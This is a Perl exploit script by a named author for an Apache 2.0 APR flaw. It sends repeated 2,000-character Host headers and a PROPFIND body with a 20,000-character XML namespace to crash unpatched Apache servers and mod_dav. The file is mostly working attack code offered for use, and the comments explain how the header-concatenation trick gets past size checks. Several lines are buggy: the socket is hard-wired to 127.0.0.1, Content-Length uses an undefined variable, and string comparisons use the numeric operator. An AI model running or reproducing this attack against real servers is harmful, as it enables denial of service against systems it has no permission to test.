#!/usr/bin/perl
#
# Apache 2.0 APR Exploit
# Written By Matthew Murphy
# Updates: http://www.techie.hopto.org/exploits/Apache-Knacker.pl
#
# Ever since I unveiled the additional details of the APR flaw in
# Apache 2.0.37-2.0.45, I've been under pressure to "put my money
# where my mouth is", and produce exploits for the flaw.  My answer
# to these people was "just give me a few days until I figure them
# out, and you'll be the first to know".  Well, despite a slight
# delay, here you have it.
#
# This Perl script will successfully exploit any un-patched Apache 2.0
# server that does not have the workarounds I highlighted applied.
#
# Okay, now it is time for my classic legal garb...
# Given that this is rushed, and probably buggy in some capacity, this
# is especially important here:
#
# No warranties are made about the performance of this tool, either
# express or implied.  Your use of this tool is an implicit agreement
# that you will not utilize it against a network if any of the following
# occur:
#
# You do not administer the network
# You are not the owner of the network, and do not have written permission
#		 from the owner for testing of this potential vulnerability (HP
# 		 speak there! :-D).
# Networks other than your own may be impacted by use of this tool in some
# 		 way.
#
# You also agree NOT to hold the author of the tool responsible for any
# damage resulting from its use, be it accidental or intentional, and also
# agree that the consequences of utilizing this tool (and any damage such
# use creates) are solely your responsibility.
#
# Contact:
# E-mail: mattmurphy@kc.rr.com
# Web: http://www.techie.hopto.org/
# AIM: NetAddict4109
#		 or for the Windows folk among us:
#		 aim:goim?screenname=NetAddict4109
#
# Enjoy!

# Base64 Encoder
#
# If you want authentication with the server via HTTP's lame Basic
# auth, put the proper string to encode BASE64 content, and use
# '%s' to represent the credentials being encoded.  For instance:
#
# base64 %s
#
# would result in:
#
# base64 userid:password
#
# If your decoder requires you to use STDIN to pass the password
# (no pun intended), set $BASE64_USE_STDIN to nonzero and do not
# use '%s' on the command-line.
$BASE64_CMD_STRING = "use_base64_encoder_here %s";

# Base64 encoder piping
#
# If your encoder requires the password to be written to STDIN,
# set this to a nonzero value.  NOTE: This requires support for
# bi-directional pipes on your OS version.
$BASE64_USE_STDIN = 0;

# Base64 encoder input handling
#
# If your encoder requires a newline after your credentials,
# set this to your newline character.
$BASE64_WRITE_NL = "";

use IO::Socket;
print STDOUT "Apache 2.0 APR Exploit\r\n";
print STDOUT "By Matthew Murphy\r\n\r\n";
print STDOUT "Enter the hostname/IP address of the server: ";
$line = <STDIN>;
$host = mychomp($line);
print STDOUT "Enter the port of the server \[80\]: ";
$line = <STDIN>;
$port = mychomp($line);
print STDOUT "Use authentication credentials for the session \[Y/N\]? ";
$line = <STDIN>;
$char = mychomp($line);
if ($char == "Y" || $char == "y") {
		 print STDOUT "What username shall we use: ";
		 $line = <STDIN>;
		 $user = mychomp($line);
		 print STDOUT "What password shall we use: ";
		 $line = <STDIN>;
		 $pass = mychomp($line);
		 $auth = "$user:$pass";
		 if ($BASE64_USE_STDIN) {
		 		 # l33t Perl piping trix; NOTE: This is definitely
		 		 # Alpha code! :-)
		 		 pipe(STDOUTREAD, STDOUTWRITE);
		 		 pipe(STDINREAD, STDINWRITE);
		 		 open(OLDSTDIN, "&STDIN");
		 		 open(OLDSTDOUT, ">&STDOUT");
		 		 open(STDIN, "&STDINREAD");
		 		 open(STDOUT, ">&STDOUTWRITE");
		 		 close(STDINREAD);
		 		 close(STDOUTWRITE);
		 		 system($BASE64_CMD_STRING);
		 		 open(STDIN, "&OLDSTDIN");
		 		 open(STDOUT, "&>OLDSTDOUT");
		 		 close(OLDSTDIN);
		 		 close(OLDSTDOUT);
		 		 print STDINWRITE $auth;
		 		 close(STDINWRITE);
		 		 read(STDOUTREAD, $base64, 4096); # Edit for insane passwords
		 		 close(STDOUTREAD);
		 } else {
		 		 open(READOUTPUT, sprintf($BASE64_CMD_STRING, $auth)."|");
		 		 read(READOUTPUT, $base64, 4096); # See above
		 		 close(READOUTPUT);
		 }
		 # Another hack for dealing with base64 encoders that output
		 # multi-lined encoded text.  HTTP specifically calls for a
		 # single line.  Note that this pattern also messes with spaces,
		 # tabs, etc., but base64 doesn't use those either, so this
		 # shouldn't matter.
		 $base64 = join("", split(/ /, $base64));
} else {
		 $base64 = undef;
}
$f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"127.0.0.1");
print STDOUT "Exploiting a proxy server \[Y/N\]? ";
$line = <STDIN>;
$char = mychomp($line);
if ($char == "Y" || $char == "y") {
		 print $f "GET / HTTP/1.1\x0d\x0a";

		 # Apache 2.0 tries to limit header inputs, but uses a hash table
		 # that ultimately concatenates multiple headers of the same name
		 # together with ", " between them, so:
		 #
		 # Host: a
		 # Host: b
		 #
		 # Bypasses Apache's buffer size checks, but ends up as:
		 #
		 # Host: a,b
		 #
		 # When processed.  Confirm this with a TRACE against your server:
		 #
		 # TRACE / HTTP/1.1
		 # Host: a
		 # Host: b
		 #
		 # The "message/http" body you receive will contain:
		 #
		 # TRACE / HTTP/1.1
		 # Host: a,b
		 #
		 # So, for those of you who are confused by this code fragment,
		 # this is what it ultimately achieves!
		 for ($i = 0; $i < 10; $i++) {
		 		 print $f "Host: ".("A"x2000)."\r\n";
		 }
		 if (defined($base64)) {
		 		 print $f "Proxy-Authorization: Basic ".$base64."\r\n";
		 }
		 print $f "\r\n";
} else {
		 print STDOUT "What resource should be probed: ";
		 $line = <STDIN>;
		 $res = mychomp($line);
		 print STDOUT "Exploit a DAV repository for this attack? \[Y/N\] ";
		 $line = <STDIN>;
		 $char = mychomp($line);
		 if ($char == "Y" || $char == "y") {
		 		 # WARNING:
		 		 # Another section of alpha code here; mod_dav tends to barf
		 		 # if given the smallest inconsistency, and this is not
		 		 # exactly well-researched.  If this doesn't work for you,
		 		 # target your DAV repository as a typical resource: if
		 		 # UseCanonicalName On hasn't been set explicitly, mod_dav
		 		 # will choke on that as well.
		 		 #
		 		 # STunnel should not have issues with this, as you can't
		 		 # use a "Host" header in an SSL connection anyway, so
		 		 # that is no problem.
		 		 #
		 		 # Note that if the body is too long, IIS servers will also
		 		 # die (assuming of course, that the latest IIS cumulative
		 		 # patch has not been applied), as they have had problems
		 		 # dealing with WebDAV in the very recent past.

		 		 # XML Body of Request
		 		 #
		 		 # If everything works, mod_dav will attempt to format a
		 		 # message with apr_psprintf() to indicate that our
		 		 # namespace is invalid, leading to a crash.
		 		 $xmlbody = "<?xml version=\"1.0\"?>\r\n";
		 		 $xmlbody.= "<D:propfind xmlns:D=\"".("A"x20000)."\:\">\r\n";
		 		 $xmlbody.= "\x20\x20\x20\x20<D:allprop/>\r\n";
		 		 $xmlbody.= "</D:propfind>";

		 		 # HTTP headers
		 		 print $f "PROPFIND $res HTTP/1.1\r\n";
		 		 print $f "Host: $host:$port\r\n";
		 		 print $f "Depth: 1\r\n";
		 		 print $f "Content-Type: text/xml; charset=\"utf-8\"\r\n";
		 		 print $f "Content-Length: ".length($body)."\r\n\r\n";
		 		 if (defined($base64)) {
		 		 		 print $f "Authorization: Basic ".$base64."\r\n";
		 		 }
		 		 print $f "$xmlbody\r\n\r\n";
		 } else {
		 		 # This does *almost* the exact same thing as the mod_proxy
		 		 # code, and could be considered wasteful, but a few extra
		 		 # CPU cycles never killed anybody. :-(
		 		 print $f "GET $res HTTP/1.1\r\n";
		 		 for ($i = 0; $i < 10; $i++) {
		 		 		 print $f "Host: ".("A"x2000)."\r\n";
		 		 }
		 		 if (defined($base64)) {
		 		 		 print $f "Authorization: Basic ".$base64."\r\n";
		 		 }
		 		 print $f "\r\n";
		 }
}
while (defined($ln = <$f>)) {
		 print STDOUT $ln;
}
undef $f;
exit;

# FIXED: The perl chomp() function is broken on my distro,
# so I hacked a fix to work around it.  This note applies
# to ActivePerl 5.8.x -- I haven't tried others.  This is
# another hackish fix, which seems to be the entire style
# of this code.  I'll write better toys when I have time to
# write better toys.
sub mychomp {
		 my $data;
		 my $arg = shift;
		 my $CRLF;
		 if ($^O == "MSWin32") {
		 		 $CRLF = 1;
		 } else {
		 		 $CRLF = 0;
		 }
		 $data = substr($arg, 0, length($arg) - $CRLF);
		 return $data;
}
